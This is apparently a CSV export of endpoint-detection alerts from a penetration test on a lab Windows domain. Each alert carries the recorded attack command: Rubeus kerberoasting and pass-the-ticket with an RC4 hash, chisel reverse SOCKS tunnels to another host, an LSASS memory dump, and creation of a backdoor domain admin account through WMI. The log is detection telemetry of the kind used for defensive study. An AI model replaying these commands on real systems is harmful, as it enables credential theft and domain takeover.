"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T16:21:27.593Z","10.0.9.44","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth /dc:10.0.9.43 /domain:plumetech-ot.local","",
"2025-03-28T16:21:26.584Z","10.0.9.44","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth /dc:10.0.9.43 /domain:plumetech-ot.local","",
"2025-03-28T16:21:26.584Z","10.0.9.44","High","70","A PowerShell script appears to be tampering with the kerberos requestor security token. This might indicate an attempt to dump credentials. Review the script.","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","@{filename=__PSScriptPolicyTest_xfikm0eo.k2b.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743176570},@{filename=__PSScriptPolicyTest_znwvvfje.usr.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743177854}",
"2025-03-28T16:21:26.584Z","10.0.9.44","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth /dc:10.0.9.43 /domain:plumetech-ot.local","",
"2025-03-28T16:21:00.551Z","10.0.9.44","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth /dc:10.0.9.43","",
"2025-03-28T16:20:59.231Z","10.0.9.44","High","70","A PowerShell script appears to be tampering with the kerberos requestor security token. This might indicate an attempt to dump credentials. Review the script.","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","@{filename=__PSScriptPolicyTest_znwvvfje.usr.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743177854},@{filename=__PSScriptPolicyTest_xfikm0eo.k2b.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743176570}",
"2025-03-28T16:20:59.231Z","10.0.9.44","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth /dc:10.0.9.43","",
"2025-03-28T16:20:59.231Z","10.0.9.44","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth /dc:10.0.9.43","",
"2025-03-28T16:20:17.178Z","10.0.9.44","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth","",
"2025-03-28T16:20:16.061Z","10.0.9.44","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth","",
"2025-03-28T16:20:16.061Z","10.0.9.44","High","70","A PowerShell script appears to be tampering with the kerberos requestor security token. This might indicate an attempt to dump credentials. Review the script.","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","@{filename=__PSScriptPolicyTest_znwvvfje.usr.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743177854},@{filename=__PSScriptPolicyTest_xfikm0eo.k2b.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743176570}",
"2025-03-28T16:20:16.061Z","10.0.9.44","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt /user:kenneth","",
"2025-03-28T16:20:08.051Z","10.0.9.44","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt","",
"2025-03-28T16:20:06.955Z","10.0.9.44","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt","",
"2025-03-28T16:20:06.955Z","10.0.9.44","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast /rc4:a7dbe0c406ba68a299d3405b48c5aedd /ptt","",
"2025-03-28T16:17:20.883Z","10.0.9.44","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast","",
"2025-03-28T16:17:20.376Z","10.0.9.44","Critical","90","A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast","",
"2025-03-28T16:17:20.376Z","10.0.9.44","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\fernando\Desktop\Rubeus.exe"" kerberoast","",
"2025-03-28T16:17:11.628Z","10.0.9.44","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Users\fernando\Desktop\Rubeus.exe""","",
"2025-03-28T16:17:11.126Z","10.0.9.44","High","70","This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.","""C:\Users\fernando\Desktop\Rubeus.exe""","",
"2025-03-28T16:16:53.165Z","10.0.9.44","High","70","A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.","C:\Windows\Explorer.EXE","@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177739},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178600},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177744},@{filename=Rubeus.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178605},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178602},@{filename=Rubeus.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178600},@{filename=Rubeus.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178602},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177741},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177742},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177743}",
"2025-03-28T16:16:52.645Z","10.0.9.44","High","70","A process has written a suspicious file to disk. Adversaries may write a malicious file to a commonly trusted directory, use a benign name, or a mismatched file extension. This is done for the sake of evading defenses and observation. Check the activity and surrounding events are expected in your environment.","C:\Windows\Explorer.EXE","@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178599},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177742},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177744},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177741},@{filename=powerview.lnk; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743177777},@{filename=Rubeus.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178602},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178600},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177743},@{filename=Rubeus.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178600},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177745}",
"2025-03-28T16:12:12.418Z","10.0.9.44","High","70","A suspicious .NET module was loaded into the process. Adversaries may load malicious .NET assemblies into a process in order to conceal the execution of malicious payloads. Investigate the process and surrounding events.","""C:\Tools\Snaffler1.exe"" -s -o snaffler.log","",
"2025-03-28T16:12:11.397Z","10.0.9.44","Low","30","This file meets the Adware/PUP Anti-malware ML algorithm's low-confidence threshold.","""C:\Tools\Snaffler1.exe"" -s -o snaffler.log","",
"2025-03-28T16:11:09.728Z","10.0.9.44","Low","30","A file written to the file-system surpassed a low-confidence adware detection threshold.","C:\Windows\Explorer.EXE","@{filename=Desktop.lnk; filepath=\Device\HarddiskVolume1\Users\Administrator\Links; timestamp=1743177435},@{filename=PingCastle.exe; filepath=\Device\Mup\tsclient\_home_user_Desktop_stealthcup; timestamp=1743178148},@{filename=Microsoft Edge.lnk; filepath=\Device\HarddiskVolume1\Users\Administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar; timestamp=1743177454},@{filename=Inveigh.exe; filepath=\Device\Mup\tsclient\_home_user_Desktop_stealthcup; timestamp=1743178126},@{filename=PingCastle.exe; filepath=\Device\Mup\tsclient\_home_user_Desktop_stealthcup; timestamp=1743178128},@{filename=Downloads.lnk; filepath=\Device\HarddiskVolume1\Users\Administrator\Links; timestamp=1743177435},@{filename=PingCastle.exe; filepath=\Device\Mup\tsclient\_home_user_Desktop_stealthcup; timestamp=1743177737},@{filename=Local Disk (C) (2).lnk; filepath=\Device\HarddiskVolume1\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743178111},@{filename=Inveigh.exe; filepath=\Device\HarddiskVolume1\Tools; timestamp=1743178147},@{filename=Inveigh.exe; filepath=\Device\Mup\tsclient\_home_user_Desktop_stealthcup; timestamp=1743178257}",
"2025-03-28T16:09:24.52Z","10.0.9.44","High","70","A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.","""C:\Tools\Inveigh.exe""","",
"2025-03-28T16:09:24.012Z","10.0.9.44","Low","30","This file meets the machine learning-based on-sensor AV protection's low confidence threshold for malicious files.","""C:\Tools\Inveigh.exe""","",
"2025-03-28T16:05:02.887Z","10.0.9.44","High","70","A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","@{filename=__PSScriptPolicyTest_znwvvfje.usr.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743177854},@{filename=__PSScriptPolicyTest_xfikm0eo.k2b.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743176570}",
"2025-03-28T16:05:02.387Z","10.0.9.44","Medium","50","A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","@{filename=__PSScriptPolicyTest_znwvvfje.usr.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743177854},@{filename=__PSScriptPolicyTest_xfikm0eo.k2b.ps1; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Local\Temp; timestamp=1743176570}",
"2025-03-28T16:03:10.778Z","10.0.9.44","High","70","A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","@{filename=__PSScriptPolicyTest_hckujis5.lva.ps1; filepath=\Device\HarddiskVolume1\Users\Administrator\AppData\Local\Temp\3; timestamp=1743177622},@{filename=__PSScriptPolicyTest_abms0evy.dvk.ps1; filepath=\Device\HarddiskVolume1\Users\Administrator\AppData\Local\Temp\3; timestamp=1743177633}",
"2025-03-28T16:03:10.262Z","10.0.9.44","Medium","50","A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","@{filename=__PSScriptPolicyTest_hckujis5.lva.ps1; filepath=\Device\HarddiskVolume1\Users\Administrator\AppData\Local\Temp\3; timestamp=1743177622},@{filename=__PSScriptPolicyTest_abms0evy.dvk.ps1; filepath=\Device\HarddiskVolume1\Users\Administrator\AppData\Local\Temp\3; timestamp=1743177633}",
"2025-03-28T15:43:53.071Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" server --port 80 --socks5","",
"2025-03-28T15:41:43.806Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" server --port 80 --socks5","",
"2025-03-28T15:40:25.892Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" server --port 3477 --socks5","",
"2025-03-28T15:40:21.14Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" server --portp 3477 --socks5","",
"2025-03-28T15:38:21.029Z","10.0.9.44","High","70","A process appears to be engaged in traffic redirection through proxies or port redirection. Inspect the process to determine if this is expected in your environment.","""C:\Users\fernando\Desktop\chisel.exe"" server -p 3477 --socks5 --reverse","",
"2025-03-28T15:38:21.029Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" server -p 3477 --socks5 --reverse","",
"2025-03-28T15:38:10.7Z","10.0.9.44","High","70","A process is suspiciously connecting to a web service, and may be using it for command and control of malicious code. Investigate the process tree and network activity.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:445 R:5100:socks","",
"2025-03-28T15:38:10.19Z","10.0.9.44","High","70","A process appears to be engaged in traffic redirection through proxies or port redirection. Inspect the process to determine if this is expected in your environment.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:445 R:5100:socks","",
"2025-03-28T15:38:10.19Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:445 R:5100:socks","",
"2025-03-28T15:37:58.298Z","10.0.9.44","High","70","A process is suspiciously connecting to a web service, and may be using it for command and control of malicious code. Investigate the process tree and network activity.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:443 R:5100:socks","",
"2025-03-28T15:37:58.298Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:443 R:5100:socks","",
"2025-03-28T15:37:58.298Z","10.0.9.44","High","70","A process appears to be engaged in traffic redirection through proxies or port redirection. Inspect the process to determine if this is expected in your environment.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:443 R:5100:socks","",
"2025-03-28T15:37:45.826Z","10.0.9.44","High","70","A process appears to be engaged in traffic redirection through proxies or port redirection. Inspect the process to determine if this is expected in your environment.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:80 R:5100:socks","",
"2025-03-28T15:37:45.826Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:80 R:5100:socks","",
"2025-03-28T15:37:45.826Z","10.0.9.44","High","70","A process is suspiciously connecting to a web service, and may be using it for command and control of malicious code. Investigate the process tree and network activity.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:80 R:5100:socks","",
"2025-03-28T15:37:13.514Z","10.0.9.44","High","70","A process is suspiciously connecting to a web service, and may be using it for command and control of malicious code. Investigate the process tree and network activity.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:3477 R:5100:socks","",
"2025-03-28T15:37:13.513Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:3477 R:5100:socks","",
"2025-03-28T15:37:13.513Z","10.0.9.44","High","70","A process appears to be engaged in traffic redirection through proxies or port redirection. Inspect the process to determine if this is expected in your environment.","""C:\Users\fernando\Desktop\chisel.exe"" client 10.0.9.30:3477 R:5100:socks","",
"2025-03-28T15:36:59.964Z","10.0.9.44","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","""C:\Users\fernando\Desktop\chisel.exe"" server -p 3477 --socks5 --reverse","",
"2025-03-28T15:36:58.691Z","10.0.9.44","High","70","A process appears to be engaged in traffic redirection through proxies or port redirection. Inspect the process to determine if this is expected in your environment.","""C:\Users\fernando\Desktop\chisel.exe"" server -p 3477 --socks5 --reverse","",
"2025-03-28T15:36:32.887Z","10.0.9.44","Low","30","A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.","C:\Windows\Explorer.EXE","@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177743},@{filename=powerview.lnk; filepath=\Device\HarddiskVolume1\Users\fernando\AppData\Roaming\Microsoft\Windows\Recent; timestamp=1743177777},@{filename=Rubeus.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178602},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177741},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177744},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178600},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177742},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177745},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743178602},@{filename=chisel.exe; filepath=\Device\Mup\tsclient\a; timestamp=1743177740}",
"2025-03-28T15:11:32.861Z","10.0.9.44","High","70","An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.","""C:\Windows\system32\taskmgr.exe"" /7","",
"2025-03-28T15:11:32.86Z","10.0.9.44","High","70","A process has created a memory dump of LSASS","""C:\Windows\system32\taskmgr.exe"" /7","",
"2025-03-28T15:03:29.505Z","10.0.9.11","High","70","A process appears to be using Windows Management Instrumentation (WMI) to suspiciously execute code. Investigate the command line and process tree.","cmd.exe /Q /c net user fernando Pentest123# /domain 1> \Windows\Temp\SiCAWV 2>&1","",
"2025-03-28T14:40:31.008Z","10.0.9.11","High","70","A process appears to be using Windows Management Instrumentation (WMI) to suspiciously execute code. Investigate the command line and process tree.","cmd.exe /Q /c net group ""Server Admins"" plumber /domain /add 1> \Windows\Temp\kGsMYc 2>&1","",
"2025-03-28T14:39:35.008Z","10.0.9.11","High","70","A user created a new user account. Attackers can create new accounts to maintain their foothold on a system. Investigate the active user and newly created account.","net  user plumber Pentest123 /domain /add ","",
"2025-03-28T14:39:34.429Z","10.0.9.11","High","70","A process appears to be using Windows Management Instrumentation (WMI) to suspiciously execute code. Investigate the command line and process tree.","cmd.exe /Q /c net user plumber Pentest123 /domain /add 1> \Windows\Temp\QnSeRX 2>&1","",
